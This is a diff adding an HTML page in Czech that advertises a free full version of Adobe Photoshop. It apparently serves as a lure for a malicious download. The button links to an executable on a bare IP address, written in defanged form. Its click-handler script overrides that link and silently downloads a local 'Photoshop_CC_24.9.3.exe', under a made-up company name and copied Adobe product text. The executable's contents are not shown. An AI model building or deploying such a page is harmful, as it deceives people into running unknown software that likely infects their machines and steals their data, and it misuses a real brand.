@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+    <link rel="icon" type="image/x-icon" href="icon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FreePhotoshop</title>
+</head>
+
+<body id="home">
+    <header>
+        <a href="#home" class="logo"><img src="logo2.png"></a>
+        <nav class="navbar">
+            <a href="#home">Domovská stránka</a>
+            <a href="#download">Stažení</a>
+            <a href="#about">O firmě</a>
+        </nav>
+    </header>
+    <div class="flex-container">
+        <div id="download" class="flex-content">
+            <h1>Photoshop Zdarma</h1>
+            <p>Nenojnovější verze Photoshopu, se všemi funkcemi zcela zdarma</p>
+            <p style="margin-bottom: 60px;">Nově můžete vyzkoušet novou verzi s funkcí, kdy za použití Umělé inteligence můžete upravovat své fotky</p>
+            <a href="hxxp://185.209.21.111/download/photoshop-v2[.]exe" id="dlBtn">Stáhnout<span class="material-symbols-outlined" style="margin-left: 10px;">
+                    download</span>
+            </a>
+        </div>
+        <div class="flex-content">
+            <div class="swiper">
+                <div class="swiper-wrapper">
+                    <div class="swiper-slide"><img src="bg4.jpg"></div>
+                    <div class="swiper-slide"><img src="bg.jpg"></div>
+                    <div class="swiper-slide"><img src="bg2.jpg"></div>
+                </div>
+                <div class="swiper-button-prev"></div>
+                <div class="swiper-button-next"></div>
+                <div class="swiper-scrollbar"></div>
+            </div>
+        </div>
+    </div>
+    <div id="about" class="box1">
+        <h1>Co je Adobe Photoshop</h1>
+        <p>
+            Adobe Photoshop je softwarová aplikace na úpravy obrázků a retušování fotografií pro použití na počítačích se systémem Windows nebo MacOS.
+            Photoshop nabízí uživatelům možnost vytvářet, vylepšovat nebo jinak upravovat obrázky, umělecká díla a ilustrace.
+            Změna pozadí, simulace skutečné malby nebo vytvoření alternativního pohledu na vesmír – to vše je možné s aplikací Adobe Photoshop.
+            Je to nejrozšířenější softwarový nástroj pro úpravu fotografií, manipulaci s obrázky a retušování mnoha formátů obrázků a video souborů.
+            Nástroje ve Photoshopu umožňují upravovat jak jednotlivé obrázky, tak i velké dávky fotografií.
+        </p>
+    </div>
+    <div id="contacts" class="box2">
+        <p>Copyright <span class="material-symbols-outlined">
+                copyright
+            </span> 2023 | All rights reserved | Made by FreePhotoshop s.r.o.</p>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+    <script>
+        const swiper = new Swiper('.swiper', {
+            // Optional parameters
+            loop: true,
+            // If we need pagination
+            pagination: {
+                el: '.swiper-pagination',
+            },
+            // Navigation arrows
+            navigation: {
+                nextEl: '.swiper-button-next',
+                prevEl: '.swiper-button-prev',
+            },
+            // And if we need scrollbar
+            scrollbar: {
+                el: '.swiper-scrollbar',
+            },
+        });
+
+        document.getElementById("dlBtn").addEventListener("click", function (event) {
+            if (event.button === 0) {
+                event.preventDefault();
+                const link = document.createElement("a");
+                link.href = "Photoshop_CC_24.9.3.exe";
+                link.download = "Photoshop_CC_24.9.3.exe";
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+        });
+    </script>
+</body>
+
+</html>
